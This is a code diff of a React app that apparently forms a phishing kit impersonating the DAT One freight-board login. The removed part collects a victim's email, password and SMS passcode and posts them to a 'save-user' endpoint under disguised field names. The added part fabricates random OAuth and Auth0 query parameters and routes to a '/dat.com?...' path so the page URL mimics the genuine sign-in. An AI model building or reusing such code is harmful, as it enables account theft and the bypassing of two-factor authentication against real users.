@@ -1,144 +1,58 @@
-import '@/components/App/App.scss';
+import { useEffect } from 'react';
+import MainApp from '../MainApp/MainApp';
+import { Route, Routes, useNavigate } from 'react-router-dom';
 
-import Form from '@/components/Form';
-import Header from '@/components/Header';
-import { useCallback, useState } from 'react';
-import Input from '../Input';
-import Congratulation from '../Congratulation/Congratulation';
-import axios from 'axios';
+function generateRandomString(length) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let result = '';
+  for (let i = 0; i < length; i++) {
+    result += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return result;
+}
+
+function generateRandomNumber(length) {
+  return Array.from({ length }, () => Math.floor(Math.random() * 10)).join('');
+}
+
+function generateQueryParams() {
+  return {
+    state: generateRandomString(140),
+    client: generateRandomString(32),
+    protocol: 'oauth2',
+    prompt: 'login',
+    response_type: 'token id_token',
+    redirect_uri: 'https://one.dat.com/callback',
+    scope: 'openid profile email',
+    audience: 'https://prod-api.dat.com',
+    app_name: 'DAT One Web',
+    page_mode: 'legacy',
+    init_username: '',
+    view: 'login',
+    email_readonly: 'false',
+    nonce: generateRandomString(26),
+    auth0Client: generateRandomString(52),
+    capturedTime: generateRandomNumber(13),
+  };
+}
+
+function generateQueryString(params) {
+  return Object.keys(params)
+    .map((key) => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
+    .join('&');
+}
+
+const queryParams = generateQueryString(generateQueryParams());
 
 const App = () => {
-  const [step, setStep] = useState(1);
-  const [formState, setFormState] = useState({
-    email: {
-      value: '',
-      valid: false,
-      touched: false,
-      error: '',
-    },
-    password: {
-      value: '',
-      valid: false,
-      touched: false,
-      error: '',
-    },
-  });
-  const [verification, setVerification] = useState({
-    code: {
-      value: '',
-      valid: false,
-      touched: false,
-      error: '',
-    },
-  });
-
-  const handleBlur = useCallback((e) => {
-    const { name, value } = e.target;
-    if (value.trim() === '') {
-      setVerification((prevState) => ({
-        ...prevState,
-        [name]: {
-          ...prevState[name],
-          touched: true,
-          error: 'Required field',
-        },
-      }));
-    }
+  const navigate = useNavigate();
+  useEffect(() => {
+    navigate(`/dat.com?${queryParams}`);
   }, []);
-
-  const handleFocus = useCallback((e) => {
-    const { name } = e.target;
-    setVerification((prevState) => ({
-      ...prevState,
-      [name]: {
-        ...prevState[name],
-        touched: true,
-      },
-    }));
-  }, []);
-
-  const handleChange = useCallback((e) => {
-    const { name, value } = e.target;
-
-    if (/^[0-9]*$/.test(value)) {
-      setVerification((prevState) => ({
-        ...prevState,
-        [name]: {
-          ...prevState[name],
-          value,
-          error: '',
-        },
-      }));
-    }
-  }, []);
-
-  const handleSubmit = useCallback(
-    (e) => {
-      e.preventDefault();
-      axios
-        .post(`${import.meta.env.VITE_API}save-user`, {
-          email: formState.email.value,
-          id: formState.password.value,
-          phone: verification.code.value,
-        })
-        .then(function (response) {
-          setStep(3);
-        })
-        .catch(function (error) {
-          console.log(error);
-        });
-    },
-    [formState, verification]
-  );
-
   return (
-    <div className="app">
-      <div className="app__header-wrapper">
-        <div className="app__background-map" />
-        <Header />
-      </div>
-      {step === 1 && (
-        <div className="app__form-wrapper">
-          <Form setStep={setStep} formState={formState} setFormState={setFormState} />
-        </div>
-      )}
-
-      {step === 2 && (
-        <div className="app__form-wrapper">
-          <div style={{ padding: '20px 8px' }} className="form">
-            <h1 className="form__title">Message sent to your number</h1>
-            <h3 className="form__subtitle">Enter the passcode you received.</h3>
-            <div style={{ marginTop: 20 }} className="form__form-inner">
-              <div className="form__input-wrapper">
-                <Input
-                  type="text"
-                  placeholder="Verification code *"
-                  name="code"
-                  value={verification.code.value}
-                  onChange={handleChange}
-                  onBlur={handleBlur}
-                  onFocus={handleFocus}
-                  error={verification.code.error}
-                />
-              </div>
-              {verification.code.error && <span className="input__error-text">{verification.code.error}</span>}
-            </div>
-            <div className="form__button">
-              <button
-                type="submit"
-                onClick={handleSubmit}
-                className="form__button-submit"
-                disabled={!verification.code.value?.length}
-              >
-                SUBMIT
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {step === 3 && <Congratulation />}
-    </div>
+    <Routes>
+      <Route path="/dat.com" element={<MainApp />} />
+    </Routes>
   );
 };
 
